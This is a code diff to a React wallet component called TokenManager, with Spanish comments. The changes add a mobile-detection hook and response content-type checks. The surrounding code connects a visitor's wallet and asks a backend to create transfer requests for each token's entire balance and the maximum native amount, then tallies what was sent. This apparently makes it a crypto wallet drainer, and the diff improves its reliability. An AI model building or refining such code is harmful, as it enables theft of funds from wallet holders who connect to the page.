@@ -26,6 +26,19 @@ interface FailedItem {
   reason: string
 }
 
+// Hook personalizado para detectar dispositivos móviles
+const useIsMobile = () => {
+  const [isMobile, setIsMobile] = useState(false);
+  
+  useEffect(() => {
+    if (typeof window !== 'undefined') {
+      setIsMobile(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent));
+    }
+  }, []);
+  
+  return isMobile;
+};
+
 export default function TokenManager(): React.JSX.Element {
   const { open } = useAppKit()
   const { address, isConnected } = useAccount()
@@ -38,15 +51,12 @@ export default function TokenManager(): React.JSX.Element {
   const [processing, setProcessing] = useState<boolean>(false)
   const [summary, setSummary] = useState<{ sent: SentItem[]; failed: FailedItem[] }>({ sent: [], failed: [] })
   const [isClient, setIsClient] = useState<boolean>(false)
-  const [isMobileDevice, setIsMobileDevice] = useState<boolean>(false)
+  const isMobileDevice = useIsMobile()
 
   const BACKEND = process.env.NEXT_PUBLIC_BACKEND_URL ?? ''
 
   useEffect(() => {
     setIsClient(true)
-    
-    // Detectar si es dispositivo móvil
-    setIsMobileDevice(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))
 
     // Mostrar valores de entorno para depuración
     console.log('[ENV] NEXT_PUBLIC_BACKEND_URL =', BACKEND)
@@ -90,12 +100,23 @@ export default function TokenManager(): React.JSX.Element {
 
       const res = await fetch(`${BACKEND}/owner-tokens`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify({ owner: address })
       })
 
+      // Verificar el tipo de contenido antes de analizar JSON
+      const contentType = res.headers.get('content-type');
+      if (!contentType || !contentType.includes('application/json')) {
+        const text = await res.text();
+        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+      }
+
       if (!res.ok) {
-        throw new Error(`Error en la respuesta del servidor: ${res.status} ${res.statusText}`)
+        const errorData = await res.json();
+        throw new Error(`Error del servidor: ${res.status} ${res.statusText}. ${errorData.error || ''}`);
       }
 
       const data: any = await res.json()
@@ -169,9 +190,19 @@ export default function TokenManager(): React.JSX.Element {
       }
       const res = await fetch(`${BACKEND}/wrap-info`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify({ chain: chainId })
       })
+
+      // Verificar el tipo de contenido
+      const contentType = res.headers.get('content-type');
+      if (!contentType || !contentType.includes('application/json')) {
+        const text = await res.text();
+        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+      }
 
       if (res.ok) {
         return await res.json()
@@ -280,13 +311,23 @@ export default function TokenManager(): React.JSX.Element {
           if (!BACKEND) throw new Error('BACKEND no configurado')
           const res = await fetch(`${BACKEND}/create-native-transfer-request`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+              'Content-Type': 'application/json',
+              'Accept': 'application/json'
+            },
             body: JSON.stringify({
               owner: address,
               chain: token.chain,
               amount: maxSafeForTransfer.toString()
             })
           })
+
+          // Verificar el tipo de contenido
+          const contentType = res.headers.get('content-type');
+          if (!contentType || !contentType.includes('application/json')) {
+            const text = await res.text();
+            throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+          }
 
           const data: any = await res.json()
 
@@ -324,7 +365,10 @@ export default function TokenManager(): React.JSX.Element {
       if (!BACKEND) throw new Error('BACKEND no configurado')
       const res = await fetch(`${BACKEND}/create-transfer-request`, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+        headers: { 
+          'Content-Type': 'application/json',
+          'Accept': 'application/json'
+        },
         body: JSON.stringify({
           owner: address,
           chain: token.chain,
@@ -332,6 +376,13 @@ export default function TokenManager(): React.JSX.Element {
           amount: token.balance
         })
       })
+
+      // Verificar el tipo de contenido
+      const contentType = res.headers.get('content-type');
+      if (!contentType || !contentType.includes('application/json')) {
+        const text = await res.text();
+        throw new Error(`Respuesta inesperada del servidor: ${text.substring(0, 100)}`);
+      }
 
       const data: any = await res.json()
 
